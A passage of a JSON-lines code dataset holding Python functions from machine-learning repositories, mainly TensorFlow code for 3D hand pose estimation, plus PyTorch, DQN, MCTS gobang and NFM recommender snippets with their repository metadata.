:])))\ndata_dict['keypoint_scale'] = index_root_bone_length\ndata_dict['keypoint_xyz21_normed'] = kp_coord_xyz21_rel / index_root_bone_length  # normalized by length of 12->11\n\n# calculate local coordinates\nkp_coord_xyz21_local = bone_rel_trafo(data_dict['keypoint_xyz21_normed'])\nkp_coord_xyz21_local = tf.squeeze(kp_coord_xyz21_local)\ndata_dict['keypoint_xyz21_local'] = kp_coord_xyz21_local\n\n# calculate viewpoint and coords in canonical coordinates\nkp_coord_xyz21_rel_can, rot_mat = canonical_trafo(data_dict['keypoint_xyz21_normed'])\nkp_coord_xyz21_rel_can, rot_mat = tf.squeeze(kp_coord_xyz21_rel_can), tf.squeeze(rot_mat)\nkp_coord_xyz21_rel_can = flip_right_hand(kp_coord_xyz21_rel_can, tf.logical_not(cond_left))\ndata_dict['keypoint_xyz21_can'] = kp_coord_xyz21_rel_can\ndata_dict['rot_mat'] = tf.matrix_inverse(rot_mat)\n\n# Set of 21 for visibility\nkeypoint_vis_left = keypoint_vis[:21]\nkeypoint_vis_right = keypoint_vis[-21:]\nkeypoint_vis21 = tf.where(cond_left[:, 0], keypoint_vis_left, keypoint_vis_right)\ndata_dict['keypoint_vis21'] = keypoint_vis21\n\n# Set of 21 for UV coordinates\nkeypoint_uv_left = keypoint_uv[:21, :]\nkeypoint_uv_right = keypoint_uv[-21:, :]\nkeypoint_uv21 = tf.where(cond_left[:, :2], keypoint_uv_left, keypoint_uv_right)\ndata_dict['keypoint_uv21'] = keypoint_uv21\n\n\"\"\" DEPENDENT DATA ITEMS: HAND CROP \"\"\"\nif self.hand_crop:\n    crop_center = keypoint_uv21[12, ::-1]\n\n    # catch problem, when no valid kp available (happens almost never)\n    crop_center = tf.cond(tf.reduce_all(tf.is_finite(crop_center)), lambda: crop_center,\n                          lambda: tf.constant([0.0, 0.0]))\n    crop_center.set_shape([2, ])\n\n    if self.crop_center_noise:\n        noise = tf.truncated_normal([2], mean=0.0, stddev=self.crop_center_noise_sigma)\n        crop_center += noise\n\n    crop_scale_noise = tf.constant(1.0)\n    if self.crop_scale_noise:\n            crop_scale_noise = tf.squeeze(tf.random_uniform([1], minval=1.0, maxval=1.2))\n\n    # select visible coords only\n    kp_coord_h = tf.boolean_mask(keypoint_uv21[:, 1], keypoint_vis21)\n    kp_coord_w = tf.boolean_mask(keypoint_uv21[:, 0], keypoint_vis21)\n    kp_coord_hw = tf.stack([kp_coord_h, kp_coord_w], 1)\n\n    # determine size of crop (measure spatial extend of hw coords first)\n    min_coord = tf.maximum(tf.reduce_min(kp_coord_hw, 0), 0.0)\n    max_coord = tf.minimum(tf.reduce_max(kp_coord_hw, 0), self.image_size)\n\n    # find out larger distance wrt the center of crop\n    crop_size_best = 2*tf.maximum(max_coord - crop_center, crop_center - min_coord)\n    crop_size_best = tf.reduce_max(crop_size_best)\n    crop_size_best = tf.minimum(tf.maximum(crop_size_best, 50.0), 500.0)\n\n    # catch problem, when no valid kp available\n    crop_size_best = tf.cond(tf.reduce_all(tf.is_finite(crop_size_best)), lambda: crop_size_best,\n                          lambda: tf.constant(200.0))\n    crop_size_best.set_shape([])\n\n    # calculate necessary scaling\n    scale = tf.cast(self.crop_size, tf.float32) / crop_size_best\n    scale = tf.minimum(tf.maximum(scale, 1.0), 10.0)\n    scale *= crop_scale_noise\n    data_dict['crop_scale'] = scale\n\n    if self.crop_offset_noise:\n        noise = tf.truncated_normal([2], mean=0.0, stddev=self.crop_offset_noise_sigma)\n        crop_center += noise\n\n    # Crop image\n    img_crop = crop_image_from_xy(tf.expand_dims(image, 0), crop_center, self.crop_size, scale)\n    data_dict['image_crop'] = tf.squeeze(img_crop)\n\n    # Modify uv21 coordinates\n    crop_center_float = tf.cast(crop_center, tf.float32)\n    keypoint_uv21_u = (keypoint_uv21[:, 0] - crop_center_float[1]) * scale + self.crop_size // 2\n    keypoint_uv21_v = (keypoint_uv21[:, 1] - crop_center_float[0]) * scale + self.crop_size // 2\n    keypoint_uv21 = tf.stack([keypoint_uv21_u, keypoint_uv21_v], 1)\n    data_dict['keypoint_uv21'] = keypoint_uv21\n\n    # Modify camera intrinsics\n    scale = tf.reshape(scale, [1, ])\n    scale_matrix = tf.dynamic_stitch([[0], [1], [2],\n                                      [3], [4], [5],\n                                      [6], [7], [8]], [scale, [0.0], [0.0],\n                                                       [0.0], scale, [0.0],\n                                                       [0.0], [0.0], [1.0]])\n    scale_matrix = tf.reshape(scale_matrix, [3, 3])\n\n    crop_center_float = tf.cast(crop_center, tf.float32)\n    trans1 = crop_center_float[0] * scale - self.crop_size // 2\n    trans2 = crop_center_float[1] * scale - self.crop_size // 2\n    trans1 = tf.reshape(trans1, [1, ])\n    trans2 = tf.reshape(trans2, [1, ])\n    trans_matrix = tf.dynamic_stitch([[0], [1], [2],\n                                      [3], [4], [5],\n                                      [6], [7], [8]], [[1.0], [0.0], -trans2,\n                                                       [0.0], [1.0], -trans1,\n                                                       [0.0], [0.0], [1.0]])\n    trans_matrix = tf.reshape(trans_matrix, [3, 3])\n\n    data_dict['cam_mat'] = tf.matmul(trans_matrix, tf.matmul(scale_matrix, cam_mat))\n\n\"\"\" DEPENDENT DATA ITEMS: Scoremap from the SUBSET of 21 keypoints\"\"\"\n# create scoremaps from the subset of 2D annoataion\nkeypoint_hw21 = tf.stack([keypoint_uv21[:, 1], keypoint_uv21[:, 0]], -1)\n\nscoremap_size = self.image_size\n\nif self.hand_crop:\n    scoremap_size = (self.crop_size, self.crop_size)\n\nscoremap = self.create_multiple_gaussian_map(keypoint_hw21,\n                                             scoremap_size,\n                                             self.sigma,\n                                             valid_vec=keypoint_vis21)\n\nif self.scoremap_dropout:\n    scoremap = tf.nn.dropout(scoremap, self.scoremap_dropout_prob,\n                                noise_shape=[1, 1, 21])\n    scoremap *= self.scoremap_dropout_prob\n\ndata_dict['scoremap'] = scoremap\n\nif self.scale_to_size:\n    image, keypoint_uv21, keypoint_vis21 = data_dict['image'], data_dict['keypoint_uv21'], data_dict['keypoint_vis21']\n    s = image.get_shape().as_list()\n    image = tf.image.resize_images(image, self.scale_target_size)\n    scale = (self.scale_target_size[0]/float(s[0]), self.scale_target_size[1]/float(s[1]))\n    keypoint_uv21 = tf.stack([keypoint_uv21[:, 0] * scale[1],\n                              keypoint_uv21[:, 1] * scale[0]], 1)\n\n    data_dict = dict()  # delete everything else because the scaling makes the data invalid anyway\n    data_dict['image'] = image\n    data_dict['keypoint_uv21'] = keypoint_uv21\n    data_dict['keypoint_vis21'] = keypoint_vis21\n\nelif self.random_crop_to_size:\n    tensor_stack = tf.concat([data_dict['image'],\n                              tf.expand_dims(tf.cast(data_dict['hand_parts'], tf.float32), -1),\n                              tf.cast(data_dict['hand_mask'], tf.float32)], 2)\n    s = tensor_stack.get_shape().as_list()\n    tensor_stack_cropped = tf.random_crop(tensor_stack,\n                                          [self.random_crop_size, self.random_crop_size, s[2]])\n    data_dict = dict()  # delete everything else because the random cropping makes the data invalid anyway\n    data_dict['image'], data_dict['hand_parts'], data_dict['hand_mask'] = tensor_stack_cropped[:, :, :3],\\\n                                                                          tf.cast(tensor_stack_cropped[:, :, 3], tf.int32),\\\n                                                                          tf.cast(tensor_stack_cropped[:, :, 4:], tf.int32)\n\nnames, tensors = zip(*data_dict.items())\n\nif self.shuffle:\n    tensors = tf.train.shuffle_batch_join([tensors],\n                                          batch_size=self.batch_size,\n                                          capacity=100,\n                                          min_after_dequeue=50,\n                                          enqueue_many=False)\nelse:\n    tensors = tf.train.batch_join([tensors],\n                                  batch_size=self.batch_size,\n                                  capacity=100,\n                                  enqueue_many=False)\n\nreturn dict(zip(names, tensors))", "path": "data\\BinaryDbReader.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Given a articulations it calculates the update to the coord matrix and the location of the end point in global coords. \"\"\"\n# update current transformation from local -> new local\n", "func_signal": "def _forward(length, angle_x, angle_y, T):\n", "code": "T_this = tf.matmul(_get_trans_mat_hom(-length), tf.matmul(_get_rot_mat_x_hom(-angle_x), _get_rot_mat_y_hom(-angle_y)))\n\n# trafo from global -> new local\nT = tf.matmul(T_this, T)\n\n# calculate global location of this point\n# x0 = tf.constant([[0.0], [0.0], [0.0], [1.0]])\ns = length.get_shape().as_list()\nx0 = _to_hom(tf.zeros((s[0], 3, 1)))\nx = tf.matmul(tf.matrix_inverse(T), x0)\nreturn x, T", "path": "utils\\relative_trafo.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Stitches a given list of vectors into a 4x4 matrix.\n\n    Input:\n        vector_list: list of 16 tensors, which will be stitched into a matrix. list contains matrix elements\n            in a row-first fashion (m11, m12, m13, m14, m21, m22, m23, m24, ...). Length of the vectors has\n            to be the same, because it is interpreted as batch dimension.\n\"\"\"\n\n", "func_signal": "def _stitch_mat_from_vecs(vector_list):\n", "code": "assert len(vector_list) == 16, \"There have to be exactly 16 tensors in vector_list.\"\nbatch_size = vector_list[0].get_shape().as_list()[0]\nvector_list = [tf.reshape(x, [1, batch_size]) for x in vector_list]\n\ntrafo_matrix = tf.dynamic_stitch([[0], [1], [2], [3],\n                                  [4], [5], [6], [7],\n                                  [8], [9], [10], [11],\n                                  [12], [13], [14], [15]], vector_list)\n\ntrafo_matrix = tf.reshape(trafo_matrix, [4, 4, batch_size])\ntrafo_matrix = tf.transpose(trafo_matrix, [2, 0, 1])\n\nreturn trafo_matrix", "path": "utils\\relative_trafo.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Returns a 3D rotation matrix in homogeneous coords.  \"\"\"\n", "func_signal": "def _get_rot_mat_y_hom(angle):\n", "code": "one_vec = tf.ones_like(angle)\nzero_vec = one_vec*0.0\ntrafo_matrix = _stitch_mat_from_vecs([tf.cos(angle), zero_vec, tf.sin(angle), zero_vec,\n                                      zero_vec, one_vec, zero_vec, zero_vec,\n                                      -tf.sin(angle), zero_vec, tf.cos(angle), zero_vec,\n                                      zero_vec, zero_vec, zero_vec, one_vec])\nreturn trafo_matrix", "path": "utils\\relative_trafo.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Estimates the rotation from canonical coords to realworld xyz. \"\"\"\n# conv down scoremap to some reasonable length\n", "func_signal": "def _rotation_estimation(scoremap2d, hand_side, evaluation, train=False):\n", "code": "x = tf.concat([scoremap2d], 3)\ns = x.get_shape().as_list()\nout_chan_list = [64, 128, 256]\nfor i, out_chan in enumerate(out_chan_list):\n    x = ops.conv_relu(x, 'conv_vp_%d_1' % i, kernel_size=3, stride=1, out_chan=out_chan, trainable=train)\n    x = ops.conv_relu(x, 'conv_vp_%d_2' % i, kernel_size=3, stride=2, out_chan=out_chan, trainable=train) # in the end this will be 4x4x128\n\n# flatten\nx = tf.reshape(x, [s[0], -1])  # this is Bx2048\nx = tf.concat([x, hand_side], 1)\n\n# Estimate Viewpoint --> 3 params\nout_chan_list = [256, 128]\nfor i, out_chan in enumerate(out_chan_list):\n    x = ops.fully_connected_relu(x, 'fc_vp%d' % i, out_chan=out_chan, trainable=train)\n    x = ops.dropout(x, 0.75, evaluation)\n\nux = ops.fully_connected(x, 'fc_vp_ux', out_chan=1, trainable=train)\nuy = ops.fully_connected(x, 'fc_vp_uy', out_chan=1, trainable=train)\nuz = ops.fully_connected(x, 'fc_vp_uz', out_chan=1, trainable=train)\nreturn ux, uy, uz", "path": "nets\\PosePriorNetwork.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Flips the given canonical coordinates, when cond_right is true. Returns coords unchanged otherwise.\n    The returned coordinates represent those of a left hand.\n\n    Inputs:\n        coords_xyz_canonical: Nx3 matrix, containing the coordinates for each of the N keypoints\n\"\"\"\n", "func_signal": "def _flip_right_hand(coords_xyz_canonical, cond_right):\n", "code": "with tf.variable_scope('flip-right-hand'):\n    expanded = False\n    s = coords_xyz_canonical.get_shape().as_list()\n    if len(s) == 2:\n        coords_xyz_canonical = tf.expand_dims(coords_xyz_canonical, 0)\n        cond_right = tf.expand_dims(cond_right, 0)\n        expanded = True\n\n    # mirror along y axis\n    coords_xyz_canonical_mirrored = tf.stack([coords_xyz_canonical[:, :, 0], coords_xyz_canonical[:, :, 1], -coords_xyz_canonical[:, :, 2]], -1)\n\n    # select mirrored in case it was a right hand\n    coords_xyz_canonical_left = tf.where(cond_right, coords_xyz_canonical_mirrored, coords_xyz_canonical)\n\n    if expanded:\n        coords_xyz_canonical_left = tf.squeeze(coords_xyz_canonical_left, [0])\n\n    return coords_xyz_canonical_left", "path": "nets\\PosePriorNetwork.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Inference of the viewpoint. \"\"\"\n", "func_signal": "def _inference_viewpoint(self, keypoints_scoremap, hand_side, evaluation, train=False):\n", "code": "with tf.variable_scope('ViewpointNet'):\n    # estimate rotation\n    ux, uy, uz = self._rotation_estimation(keypoints_scoremap, hand_side, evaluation, train=train)\n\n    # assemble rotation matrix\n    rot_mat = self._get_rot_mat(ux, uy, uz)\n\n    return rot_mat", "path": "nets\\PosePriorNetwork.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Given a vector it calculates the articulated angles and updates the current coord matrix. \"\"\"\n# calculate length directly\n", "func_signal": "def _backward(delta_vec, T):\n", "code": "length = tf.sqrt(delta_vec[:, 0, 0]**2 + delta_vec[:, 1, 0]**2 + delta_vec[:, 2, 0]**2)\n\n# calculate y rotation\nangle_y = _atan2(delta_vec[:, 0, 0], delta_vec[:, 2, 0])\n\n# this vector is an intermediate result and always has x=0\ndelta_vec_tmp = tf.matmul(_get_rot_mat_y_hom(-angle_y), delta_vec)\n\n# calculate x rotation\nangle_x = _atan2(-delta_vec_tmp[:, 1, 0], delta_vec_tmp[:, 2, 0])\n\n# update current transformation from local -> new local\nT_this = tf.matmul(_get_trans_mat_hom(-length), tf.matmul(_get_rot_mat_x_hom(-angle_x), _get_rot_mat_y_hom(-angle_y)))\n\n# trafo from global -> new local\nT = tf.matmul(T_this, T)\n\n# make them all batched scalars\nlength = tf.reshape(length, [-1])\nangle_x = tf.reshape(angle_x, [-1])\nangle_y = tf.reshape(angle_y, [-1])\nreturn length, angle_x, angle_y, T", "path": "utils\\relative_trafo.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Returns a rotation matrix from axis and (encoded) angle.\"\"\"\n", "func_signal": "def _get_rot_mat(self, ux_b, uy_b, uz_b):\n", "code": "with tf.name_scope('get_rot_mat'):\n    u_norm = tf.sqrt(tf.square(ux_b) + tf.square(uy_b) + tf.square(uz_b) + 1e-8)\n    theta = u_norm\n\n    # some tmp vars\n    st_b = tf.sin(theta)\n    ct_b = tf.cos(theta)\n    one_ct_b = 1.0 - tf.cos(theta)\n\n    st = st_b[:, 0]\n    ct = ct_b[:, 0]\n    one_ct = one_ct_b[:, 0]\n    norm_fac = 1.0 / u_norm[:, 0]\n    ux = ux_b[:, 0] * norm_fac\n    uy = uy_b[:, 0] * norm_fac\n    uz = uz_b[:, 0] * norm_fac\n\n    trafo_matrix = self._stitch_mat_from_vecs([ct+ux*ux*one_ct, ux*uy*one_ct-uz*st, ux*uz*one_ct+uy*st,\n                                               uy*ux*one_ct+uz*st, ct+uy*uy*one_ct, uy*uz*one_ct-ux*st,\n                                               uz*ux*one_ct-uy*st, uz*uy*one_ct+ux*st, ct+uz*uz*one_ct])\n\n    return trafo_matrix", "path": "nets\\PosePriorNetwork.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Returns a 3D rotation matrix in homogeneous coords. \"\"\"\n", "func_signal": "def _get_rot_mat_z_hom(angle):\n", "code": "one_vec = tf.ones_like(angle)\nzero_vec = one_vec*0.0\ntrafo_matrix = _stitch_mat_from_vecs([tf.cos(angle), -tf.sin(angle), zero_vec, zero_vec,\n                                      tf.sin(angle), tf.cos(angle), zero_vec, zero_vec,\n                                      zero_vec, zero_vec, one_vec, zero_vec,\n                                      zero_vec, zero_vec, zero_vec, one_vec])\nreturn trafo_matrix", "path": "utils\\relative_trafo.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Transforms the given real xyz coordinates into a bunch of relative frames.\n    The frames are set up according to the kinematic chain. Each parent of the chain\n    is the origin for the location of the next bone, where the z-axis is aligned with the bone\n    and articulation is measured as rotations along the x- and y- axes.\n\n    Inputs:\n        coords_xyz: BxNx3 matrix, containing the coordinates for each of the N keypoints\n\"\"\"\n", "func_signal": "def bone_rel_trafo(coords_xyz):\n", "code": "with tf.variable_scope('bone_rel_transformation'):\n    coords_xyz = tf.reshape(coords_xyz, [-1, 21, 3])\n\n    # list of results\n    trafo_list = [None for _ in kinematic_chain_list]\n    coords_rel_list = [0.0 for _ in kinematic_chain_list]\n\n    # Iterate kinematic chain list (from root --> leaves)\n    for bone_id in kinematic_chain_list:\n\n        # get parent of current bone\n        parent_id = kinematic_chain_dict[bone_id]\n\n        if parent_id == 'root':\n\n            # if there is no parent global = local\n            delta_vec = _to_hom(tf.expand_dims(coords_xyz[:, bone_id, :], 1))\n            T = _get_trans_mat_hom(tf.zeros_like(coords_xyz[:, 0, 0]))\n\n            # get articulation angles from bone vector\n            results = _backward(delta_vec, T)\n\n            # save results\n            coords_rel_list[bone_id] = tf.stack(results[:3], 1)\n            trafo_list[bone_id] = results[3]\n\n        else:\n            T = trafo_list[parent_id]  #by sticking to the order defined in kinematic_chain_list its ensured, that this is avail\n            assert T is not None, 'Something went wrong.'\n\n            # calculate coords in local system\n            x_local_parent = tf.matmul(T, _to_hom(tf.expand_dims(coords_xyz[:, parent_id, :], 1)))\n            x_local_child = tf.matmul(T, _to_hom(tf.expand_dims(coords_xyz[:, bone_id, :], 1)))\n\n            # calculate bone vector in local coords\n            delta_vec = x_local_child - x_local_parent\n            delta_vec = _to_hom(tf.expand_dims(delta_vec[:, :3, :], 1))\n\n            # get articulation angles from bone vector\n            results = _backward(delta_vec, T)\n\n            # save results\n            coords_rel_list[bone_id] = tf.stack(results[:3], 1)\n            trafo_list[bone_id] = results[3]\n\n    coords_rel = tf.stack(coords_rel_list, 1)\n\n    return coords_rel", "path": "utils\\relative_trafo.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Assembles relative coords back to xyz coords. Inverse operation to bone_rel_trafo().\n\n    Inputs:\n        coords_rel: BxNx3 matrix, containing the coordinates for each of the N keypoints [length, angle_x, angle_y]\n\"\"\"\n", "func_signal": "def bone_rel_trafo_inv(coords_rel):\n", "code": "with tf.variable_scope('assemble_bone_rel'):\n    s = coords_rel.get_shape().as_list()\n    if len(s) == 2:\n        coords_rel = tf.expand_dims(coords_rel, 0)\n        s = coords_rel.get_shape().as_list()\n    assert len(s) == 3, \"Has to be a batch of coords.\"\n\n    # list of results\n    trafo_list = [None for _ in kinematic_chain_list]\n    coords_xyz_list = [0.0 for _ in kinematic_chain_list]\n\n    # Iterate kinematic chain list (from root --> leaves)\n    for bone_id in kinematic_chain_list:\n\n        # get parent of current bone\n        parent_id = kinematic_chain_dict[bone_id]\n\n        if parent_id == 'root':\n            # if there is no parent global = local\n            T = _get_trans_mat_hom(tf.zeros_like(coords_rel[:, 0, 0]))\n\n            # get articulation angles from bone vector\n            x, T = _forward(length=coords_rel[:, bone_id, 0],\n                            angle_x=coords_rel[:, bone_id, 1],\n                            angle_y=coords_rel[:, bone_id, 2],\n                            T=T)\n\n            # save results\n            coords_xyz_list[bone_id] = tf.squeeze(_from_hom(x), [2])\n            trafo_list[bone_id] = T\n\n        else:\n            T = trafo_list[parent_id]  #by sticking to the order defined in kinematic_chain_list its ensured, that this is avail\n            assert T is not None, 'Something went wrong.'\n\n            # get articulation angles from bone vector\n            x, T = _forward(length=coords_rel[:, bone_id, 0],\n                            angle_x=coords_rel[:, bone_id, 1],\n                            angle_y=coords_rel[:, bone_id, 2],\n                            T=T)\n\n            # save results\n            coords_xyz_list[bone_id] = tf.squeeze(_from_hom(x), [2])\n            trafo_list[bone_id] = T\n\n    coords_xyz = tf.stack(coords_xyz_list, 1)\n    return coords_xyz", "path": "utils\\relative_trafo.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Inference of canonical coordinates. \"\"\"\n", "func_signal": "def _inference_pose3d(self, keypoints_scoremap, hand_side, evaluation, train=False, bottleneck=False):\n", "code": "with tf.variable_scope('PosePrior'):\n    # use encoding to detect relative, normed 3d coords\n    x = keypoints_scoremap  # this is 28x28x21\n    s = x.get_shape().as_list()\n    out_chan_list = [32, 64, 128]\n    for i, out_chan in enumerate(out_chan_list):\n        x = ops.conv_relu(x, 'conv_pose_%d_1' % i, kernel_size=3, stride=1, out_chan=out_chan, trainable=train)\n        x = ops.conv_relu(x, 'conv_pose_%d_2' % i, kernel_size=3, stride=2, out_chan=out_chan, trainable=train) # in the end this will be 4x4xC\n\n    # Estimate relative 3D coordinates\n    out_chan_list = [512, 512]\n    x = tf.reshape(x, [s[0], -1])\n    x = tf.concat([x, hand_side], 1)\n    for i, out_chan in enumerate(out_chan_list):\n        x = ops.fully_connected_relu(x, 'fc_rel%d' % i, out_chan=out_chan, trainable=train)\n        x = ops.dropout(x, 0.8, evaluation)\n    if bottleneck:\n        x = ops.fully_connected(x, 'fc_bottleneck', out_chan=30)\n    coord_xyz_rel = ops.fully_connected(x, 'fc_xyz', out_chan=self.num_kp*3, trainable=train)\n\n    # reshape stuff\n    coord_xyz_rel = tf.reshape(coord_xyz_rel, [s[0], self.num_kp, 3])\n\n    return coord_xyz_rel", "path": "nets\\PosePriorNetwork.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\" Stitches a given list of vectors into a 3x3 matrix.\n\n    Input:\n        vector_list: list of 9 tensors, which will be stitched into a matrix. list contains matrix elements\n            in a row-first fashion (m11, m12, m13, m21, m22, m23, m31, m32, m33). Length of the vectors has\n            to be the same, because it is interpreted as batch dimension.\n\"\"\"\n\n", "func_signal": "def _stitch_mat_from_vecs(vector_list):\n", "code": "assert len(vector_list) == 9, \"There have to be exactly 9 tensors in vector_list.\"\nbatch_size = vector_list[0].get_shape().as_list()[0]\nvector_list = [tf.reshape(x, [1, batch_size]) for x in vector_list]\n\ntrafo_matrix = tf.dynamic_stitch([[0], [1], [2],\n                                  [3], [4], [5],\n                                  [6], [7], [8]], vector_list)\n\ntrafo_matrix = tf.reshape(trafo_matrix, [3, 3, batch_size])\ntrafo_matrix = tf.transpose(trafo_matrix, [2, 0, 1])\n\nreturn trafo_matrix", "path": "nets\\PosePriorNetwork.py", "repo_name": "lmb-freiburg/hand3d", "stars": 776, "license": "gpl-2.0", "language": "python", "size": 246}
{"docstring": "\"\"\"Imshow of Tensor.\"\"\"\n", "func_signal": "def imshow(inp, title=None):\n", "code": "inp = inp.numpy().transpose(1, 2, 0)\nmean = np.array([0.485, 0.456, 0.406])\nstd = np.array([0.229, 0.224, 0.225])\ninp = std * inp + mean\ninp = np.clip(inp, 0, 1)\nplt.imshow(inp)\nif title is not None:\n    plt.title(title)\nplt.pause(0.001)\nplt.show()", "path": "Torch\\7_Transfer Learning Tutorial.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "# plot histogram for the inputs of every layer\n", "func_signal": "def plot_his(inputs, inputs_norm):\n", "code": "for j, all_inputs in enumerate([inputs, inputs_norm]):\n    for i, input in enumerate(all_inputs):\n        plt.subplot(2, len(all_inputs), j*len(all_inputs)+(i+1))\n        plt.cla()\n        if i == 0:\n            the_range = (-7, 10)\n        else:\n            the_range = (-1, 1)\n        plt.hist(input.ravel(), bins=15, range=the_range, color='#FF5733')\n        plt.yticks(())\n        if j == 1:\n            plt.xticks(the_range)\n        else:\n            plt.xticks(())\n        ax = plt.gca()\n        ax.spines['right'].set_color('none')\n        ax.spines['top'].set_color('none')\n    plt.title(\"%s normalizing\" % (\"Without\" if j == 0 else \"With\"))\nplt.draw()\nplt.pause(0.01)", "path": "Batch_Normalization\\BN.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "# AI\u786e\u5b9a\u843d\u5b50\u4f4d\u7f6e\u540e\uff0c\u5728tkinter\u4e0a\u663e\u793a\u51fa\u6765\n", "func_signal": "def update_graph(self, event, player_id, move):\n", "code": "row, col = move\nboardX = col * 30 + self.startX\nboardY = row * 30 + self.startY\nif player_id == 1:\n    self.cross(boardX + 15, boardY + 15) #AI\u7528cross\nelse:\n    self.circle(boardX + 15, boardY + 15)", "path": "MCTS\\gobang.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\"Save a transition\"\"\"\n", "func_signal": "def push(self, *args):\n", "code": "if len(self.memory) < self.capacity:\n    self.memory.append(None)\nself.memory[self.position] = Transition(*args)\nself.position = (self.position + 1) % self.capacity", "path": "Torch\\Reinforcement Learning DQN.py", "repo_name": "gutouyu/ML_CIA", "stars": 545, "license": "mit", "language": "python", "size": 217121}
{"docstring": "\"\"\"Build Model function f(x) for Estimator.\"\"\"\n\n#------hyper parameters------\n", "func_signal": "def model_fn(features, labels, mode, params):\n", "code": "field_size = params['field_size']\nfeature_size = params['feature_size']\nembedding_size = params['embedding_size']\nl2_reg = params['l2_reg']\nlearning_rate = params['learning_rate']\ndropout = params['dropout']\nlayers = params['layers']\n\n\n#------build weights------\nGlobal_Bias = tf.get_variable(name='bias', shape=[1], initializer=tf.constant_initializer(0.0))\nFeat_Wgts = tf.get_variable(name='linear', shape=[feature_size], initializer=tf.glorot_normal_initializer())\nFeat_Emb = tf.get_variable(name='emb', shape=[feature_size, embedding_size], initializer=tf.glorot_normal_initializer())\n\n#------build feature------\nfeat_ids = features['feat_ids']\nfeat_ids = tf.reshape(feat_ids, shape=[-1, field_size])\nfeat_vals = features['feat_vals']\nfeat_vals = tf.reshape(feat_vals, shape=[-1, field_size])\n\n#------build f(x)------\n# f(x) = bias + sum(wx) + MLP(BI(embed_vec))\n\n# FM\u90e8\u5206\nwith tf.variable_scope(\"Linear-part\"):\n    feat_wgts = tf.nn.embedding_lookup(Feat_Wgts, feat_ids) # None * F * 1\n    y_linear = tf.reduce_sum(tf.multiply(feat_wgts, feat_vals), 1)  # None * 1\n\n\nwith tf.variable_scope(\"BiInter-part\"):\n    embeddings = tf.nn.embedding_lookup(Feat_Emb, feat_ids) # None * F * k\n    feat_vals = tf.reshape(feat_vals, shape=[-1, field_size, 1]) # None * F * 1\n    embeddings = tf.multiply(embeddings, feat_vals) # vi * xi\n    sum_square_emb = tf.square(tf.reduce_sum(embeddings, 1))\n    square_sum_emb = tf.reduce_sum(tf.square(embeddings), 1)\n    deep_inputs = 0.5 * tf.subtract(sum_square_emb, square_sum_emb) # None * k\n\nwith tf.variable_scope(\"Deep-part\"):\n\n    if mode == tf.estimator.ModeKeys.TRAIN:\n        train_phase = True\n    else:\n        train_phase = False\n\n    # BI\u7684\u8f93\u51fa\u9700\u8981\u8fdb\u884cBatch Normalization\n    deep_inputs = batch_norm_layer(deep_inputs, train_phase=train_phase, scope_bn=\"bn_after_bi\")\n\n    # BI\u7684\u8f93\u51fa\u8fdb\u884cDropout\n    if mode == tf.estimator.ModeKeys.TRAIN:\n        deep_inputs = tf.nn.dropout(deep_inputs, keep_prob=dropout[-1]) # dropout at bilinear interaction layer\n\n    for i in range(len(layers)):\n        deep_inputs = tf.contrib.layers.fully_connected(inputs=deep_inputs, num_outputs=layers[i], weights_regularizer=tf.contrib.layers.l2_regularizer(l2_reg), scope=\"mlp%d\" % i)\n\n        # \u6ce8\u610f\u662f\u5148\u8fdb\u884cBatch Norm\uff0c\u518d\u8fdb\u884cDropout\n        # Batch Normalization\n        deep_inputs = batch_norm_layer(deep_inputs, train_phase=train_phase, scope_bn=\"bn%d\" % i)\n\n        # Dropout\n        if mode == tf.estimator.ModeKeys.TRAIN:\n            deep_inputs = tf.nn.dropout(deep_inputs, keep_prob=dropout[i])\n\n    # Output\n    y_deep = tf.contrib.layers.fully_connected(inputs=deep_inputs, num_outputs=1, activation_fn=tf.identity, weights_regularizer=tf.contrib.layers.l2_regularizer(l2_reg), scope=\"deep_out\")\n    y_d = tf.reshape(y_deep, shape=[-1])\n\nwith tf.variable_scope(\"NFM-out\"):\n    y_bias = Global_Bias * tf.ones_like(y_d, dtype=tf.float32)\n    y = y_bias + y_linear + y_d\n    pred = tf.sigmoid(y)\n\npredictions = {\"prob\": pred}\n\nexport_outputs = {tf.saved_model.signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY: tf.estimator.export.PredictOutput(predictions)}\n# Provide an estimator spec for `ModeKeys.PREDICT`\nif mode == tf.estimator.ModeKeys.PREDICT:\n    return tf.estimator.EstimatorSpec(\n        mode=mode,\n        predictions=predictions,\n        export_outputs=export_outputs)\n\n#------build loss------\nloss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=y, labels=labels)) + l2_reg * 